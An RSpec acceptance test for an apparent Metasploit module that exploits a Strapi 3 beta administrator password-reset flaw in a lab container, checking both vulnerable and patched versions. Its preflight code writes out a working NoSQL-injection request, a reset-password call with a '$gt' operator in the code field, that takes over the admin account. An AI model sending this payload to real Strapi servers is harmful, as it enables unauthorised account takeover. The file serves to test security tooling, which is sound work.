require 'acceptance_spec_helper'
require 'net/http'
require 'digest'

RSpec.describe 'Genuine Strapi administrator password reset', acceptance: true, order: :defined do
  include_context 'module target'

  let(:owner_fullname) { 'auxiliary/scanner/http/strapi_3_password_reset' }
  let_it_be(:initial_password) { 'NativeInitial123!' }

  before(:all) do
    @version = ENV.fetch('STRAPI_VERSION')
    @exposed = @version == '3.0.0-beta.17.4'
    @init_birth = target_exec('target', 'cat', '/proc/1/stat').split(') ', 2).last.split.fetch(19)
    @vendor = JSON.parse(target_exec('target', 'node', '/lab/verify.js', @version, '/dependencies').lines.last)
    expect(@vendor.values_at('verified', 'source_files')).to eq([true, 13])
    native_preflight
    expect(console_command('db_connect module_framework:module-target-framework-db-password@reporting_db:5432/module_targets', timeout: 120)).not_to match(/\[-\]|Error|Exception/)
    expect(console_command('db_status')).to include('Connected to module_targets. Connection type: postgresql.')
  end

  before do |example|
    @workspace = "strapi_#{example.metadata.fetch(:scoped_id).tr(':', '_')}"
    expect(console_command("workspace -a #{@workspace}")).not_to include('[-]')
    restore_account
    expect(reports.fetch('credentials')).to eq([])
  end

  after do
    record('final-account-state.jsonl', snapshot)
    restore_account
    %w[sessions jobs].each do |kind|
      expect(console_command("irb -e 'puts \"STRAPI_IDLE=\" + framework.#{kind}.keys.to_json'")).to include('STRAPI_IDLE=[]')
    end
    expect(target_exec('target', 'cat', '/proc/1/stat').split(') ', 2).last.split.fetch(19)).to eq(@init_birth)
  end

  after(:all) do
    %w[target database framework reporting_db].each do |role|
      expect(target_exec(role, 'cat', '/sys/fs/cgroup/memory.events')).to include("oom 0\n", "oom_kill 0\n")
      expect(target_exec(role, 'cat', '/sys/fs/cgroup/pids.events').strip).to eq('max 0')
    end
  end

  it 'checks the genuine affected or patched version twice without resetting credentials' do
    2.times do
      output = owner(initial_password, action: 'check')
      expect(output).to include(@exposed ? 'The target appears to be vulnerable' : 'The target is not exploitable')
      expect(snapshot.fetch('password')).to eq(@seed.fetch('password'))
      expect(reports.fetch('credentials')).to eq([])
    end
  end

  it 'resets pending-token accounts twice and reports the actual credentials' do
    reset_twice { |iteration| "ModulePendingPassword#{iteration}!" }
  end

  it 'preserves spaces, quotes, backslashes and Unicode in two password changes' do
    reset_twice { |iteration| "Strapi \"quote\" 'space' \\ Ω#{iteration}!" }
  end

  it 'declines fresh accounts without a pending token twice' do
    2.times do |iteration|
      database("db.strapi_administrator.update({username:'moduleadmin'},{$unset:{resetPasswordToken:''}});print('null')")
      refused_reset("ModuleFreshPassword#{iteration}!")
    end
  end

  it 'declines consumed reset tokens twice' do
    2.times do |iteration|
      database("db.strapi_administrator.update({username:'moduleadmin'},{$set:{resetPasswordToken:null}});print('null')")
      refused_reset("ModuleConsumedPassword#{iteration}!")
    end
  end

  it 'declines targets with no administrator twice' do
    database("db.strapi_administrator.remove({username:'moduleadmin'});print('null')")
    2.times do |iteration|
      output = owner("ModuleNoAccountPassword#{iteration}!")
      expect(output).to include('Could not change admin user password')
      expect(snapshot).to be_nil
      expect(reports.fetch('credentials')).to eq([])
    end
  end

  def record(name, value)
    File.open(File.join(target_runtime.fetch('artifacts'), name), 'a') { |file| file.puts(JSON.generate(value)) }
  end

  def native_request(path, body = nil)
    endpoint = target_endpoint('target')
    uri = URI("http://#{endpoint.fetch('host')}:#{endpoint.fetch('port')}#{path}")
    request = body ? Net::HTTP::Post.new(uri) : Net::HTTP::Get.new(uri)
    request['Content-Type'] = 'application/json'
    request.body = JSON.generate(body) if body
    response = Net::HTTP.start(uri.host, uri.port, open_timeout: 5, read_timeout: 10) { |http| http.request(request) }
    result = { 'status' => response.code.to_i, 'body' => JSON.parse(response.body) }
    record('native-http.jsonl', path: path, request: body, result: result, body_sha256: Digest::SHA256.hexdigest(response.body))
    result
  end

  def login(password, status)
    result = native_request('/admin/auth/local', 'identifier' => 'admin@example.invalid', 'password' => password)
    expect(result.fetch('status')).to eq(status), result.inspect
    if status == 200
      expect(result.fetch('body').fetch('user').fetch('username')).to eq('moduleadmin')
      expect(result.fetch('body').fetch('jwt')).not_to be_empty
    end
  end

  def database(code)
    JSON.parse(target_exec('database', 'mongo', '--quiet', 'strapi', '--eval', code).strip)
  end

  def snapshot
    database("print(JSON.stringify(db.strapi_administrator.findOne({username:'moduleadmin'})))")
  end

  def pending_token(letter = 'b')
    token = letter * 128
    database("db.strapi_administrator.update({username:'moduleadmin'},{$set:{resetPasswordToken:#{token.inspect}}});print('null')")
    expect(snapshot.fetch('resetPasswordToken')).to eq(token)
    token
  end

  def register_account
    result = native_request('/admin/auth/local/register', 'username' => 'moduleadmin', 'email' => 'admin@example.invalid', 'password' => initial_password)
    expect(result.fetch('status')).to eq(200), result.inspect
    @seed = snapshot
    expect(result.fetch('body').fetch('user').fetch('id')).to eq(@seed.fetch('_id').fetch('$oid'))
  end

  def restore_account
    if snapshot.nil?
      register_account
    else
      database("db.strapi_administrator.update({username:'moduleadmin'},{$set:{password:#{@seed.fetch('password').inspect},blocked:false},$unset:{resetPasswordToken:''}});print('null')")
    end
    login(initial_password, 200)
  end

  def native_preflight
    result = native_request('/admin/init')
    expect(result.fetch('status')).to eq(200)
    expect(result.fetch('body').fetch('data').fetch('strapiVersion')).to eq(@version)
    expect(result.fetch('body').fetch('data').fetch('uuid')).to be_falsey.or eq('')
    register_account
    login('wrong-native-password', 400)
    login(initial_password, 200)
    fresh = native_request('/admin/auth/reset-password', 'code' => { '$gt' => 0 }, 'password' => 'NativeFreshAttempt!', 'passwordConfirmation' => 'NativeFreshAttempt!')
    expect(fresh.fetch('status')).to eq(400)
    token = pending_token('a')
    legitimate = native_request('/admin/auth/reset-password', 'code' => token, 'password' => 'NativeLegitimate234!', 'passwordConfirmation' => 'NativeLegitimate234!')
    expect(legitimate.fetch('status')).to eq(200)
    login(initial_password, 400)
    login('NativeLegitimate234!', 200)
    expect(snapshot.fetch('resetPasswordToken')).to be_nil
    token = pending_token
    before = snapshot
    attempt = native_request('/admin/auth/reset-password', 'code' => { '$gt' => 0 }, 'password' => 'NativeObjectAttempt345!', 'passwordConfirmation' => 'NativeObjectAttempt345!')
    expect(attempt.fetch('status')).to eq(@exposed ? 200 : 400)
    login('NativeLegitimate234!', @exposed ? 400 : 200)
    login('NativeObjectAttempt345!', @exposed ? 200 : 400)
    current = snapshot
    if @exposed
      expect(current.fetch('password')).not_to eq(before.fetch('password'))
      expect(current.fetch('resetPasswordToken')).to be_nil
    else
      expect(current.values_at('password', 'resetPasswordToken')).to eq([before.fetch('password'), token])
    end
    token = pending_token('c')
    complex = 'Native "quote" \\ Ω-safe'
    legitimate = native_request('/admin/auth/reset-password', 'code' => token, 'password' => complex, 'passwordConfirmation' => complex)
    expect(legitimate.fetch('status')).to eq(200)
    login(@exposed ? 'NativeObjectAttempt345!' : 'NativeLegitimate234!', 400)
    login(complex, 200)
    record('native-proof.jsonl', version: @version, exposed: @exposed, vendor: @vendor, account_id: @seed.fetch('_id').fetch('$oid'))
    restore_account
  end

  def owner(password, action: 'run')
    output = nil
    begin
      output = run_target_module(owner_fullname, 'target', { 'NEW_PASSWORD' => password, 'THREADS' => 1, 'HttpClientTimeout' => 8 }, action: action, allow_errors: true, command_timeout: 45)
    ensure
      text = (output || console.all_data).dup.force_encoding(Encoding::UTF_8)
      record('owning-calls.jsonl', action: action, password: password, workspace: @workspace, wrapper_returned: !output.nil?, output: text)
    end
    expect(text).not_to include('Unknown datastore option')
    text
  end

  def reset_twice
    old_password = initial_password
    2.times do |iteration|
      token = pending_token
      before = snapshot
      password = yield(iteration)
      output = owner(password)
      current = snapshot
      if @exposed
        expect(output).to include('Password changed successfully!', 'User: moduleadmin', 'Email: admin@example.invalid')
        login(old_password, 400)
        login(password, 200)
        expect(current.fetch('password')).not_to eq(before.fetch('password'))
        expect(current.fetch('resetPasswordToken')).to be_nil
        credentials = reports.fetch('credentials')
        expect(credentials.length).to eq(iteration + 1)
        row = credentials.find { |credential| credential.fetch('private_data') == password }
        endpoint = target_runtime.fetch('module_endpoints').fetch('target')
        expect(row).to include('username' => 'moduleadmin', 'private_type' => 'Metasploit::Credential::Password', 'module_full_name' => owner_fullname, 'host' => endpoint.fetch('host'), 'port' => endpoint.fetch('port'))
        old_password = password
      else
        expect(output).to include('Could not change admin user password')
        login(old_password, 200)
        login(password, 400)
        expect(current.values_at('password', 'resetPasswordToken')).to eq([before.fetch('password'), token])
        expect(reports.fetch('credentials')).to eq([])
      end
    end
  end

  def refused_reset(password)
    before = snapshot
    output = owner(password)
    expect(output).to include('Could not change admin user password')
    expect(snapshot.fetch('password')).to eq(before.fetch('password'))
    login(initial_password, 200)
    login(password, 400)
    expect(reports.fetch('credentials')).to eq([])
  end

  def reports
    raise ArgumentError, 'Invalid Strapi fixture workspace' unless @workspace.match?(/\Astrapi_[0-9_]+\z/)

    query = <<~SQL
      SELECT coalesce(json_agg(row ORDER BY row.id),'[]'::json) FROM (
        SELECT c.id,p.username,secret.data AS private_data,secret.type AS private_type,c.origin_type,
          o.module_full_name,s.id AS service_id,s.port,s.proto,s.name AS service,host(h.address::inet) AS host
        FROM metasploit_credential_cores c JOIN workspaces w ON w.id=c.workspace_id
        LEFT JOIN metasploit_credential_publics p ON p.id=c.public_id
        LEFT JOIN metasploit_credential_privates secret ON secret.id=c.private_id
        LEFT JOIN metasploit_credential_origin_services o ON o.id=c.origin_id AND c.origin_type='Metasploit::Credential::Origin::Service'
        LEFT JOIN services s ON s.id=o.service_id LEFT JOIN hosts h ON h.id=s.host_id WHERE w.name='#{@workspace}'
      ) row
    SQL
    credentials = JSON.parse(target_exec('reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query))
    result = { 'credentials' => credentials }
    record('native-report-snapshots.jsonl', workspace: @workspace, reports: result)
    result
  end
end
